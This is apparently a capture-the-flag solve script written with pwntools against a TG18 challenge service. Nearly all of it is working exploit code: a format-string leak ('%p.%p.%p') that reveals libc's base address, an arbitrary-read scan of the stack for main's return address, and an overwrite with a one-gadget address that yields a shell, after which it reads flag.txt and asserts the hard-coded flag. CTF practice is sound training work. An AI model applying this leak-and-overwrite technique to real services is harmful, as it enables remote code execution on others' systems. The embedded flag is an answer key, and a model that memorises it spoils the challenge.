from pwn import *

r = remote("arbitrary.tghack.no", 3190)

def do_read(addr):
	r.recvuntil(">")
	r.sendline("1")
	r.recvuntil("address? ")
	r.sendline(hex(addr))
	r.recvuntil("value: ")
	return r.recvline()[:-1]

def do_write(addr, value):
	r.recvuntil(">")
	r.sendline("2")
	r.recvuntil("address? ")
	r.sendline(hex(addr))
	r.recvuntil("value? ")
	r.sendline(hex(value))
	r.recvline()

# we leak __write_nocancel + 7
leak_off = 0xf7290

r.recvuntil("name? ")
# leak three registers, nothing else important on the stack
r.sendline("%p.%p.%p")

r.recvuntil("Welcome ")
data = r.recvline().split(".")

libc_base = int(data[1], 16) - leak_off
log.info("libc base: {}".format(hex(libc_base)))

libc_stack_end = libc_base + 0x5efe60
stack_end = int(do_read(libc_stack_end), 16)
log.info("stack end: {}".format(hex(stack_end)))

start_main_ret = hex(libc_base + 0x0000000000020740 + 240)
addrs = []
for i in range(stack_end, stack_end - (8 * 256), -8):
	val = do_read(i)
	if val == start_main_ret:
		break

log.info("found return from main: {}".format(val))
oneshot = libc_base + 0xf1117

do_write(i, oneshot)

log.success("shell 4 u <3")
r.sendline("3")
r.recvuntil(">")
#r.interactive()

# check that we can retrieve the flag!
r.sendline("cat flag.txt")
flag = r.recvline()[:-1].lstrip()

log.success("flag: {}".format(flag))
assert flag == "TG18{n3xt_t1m3_w3_sh0uld_protect_th3_st4ck_as_w3ll}"
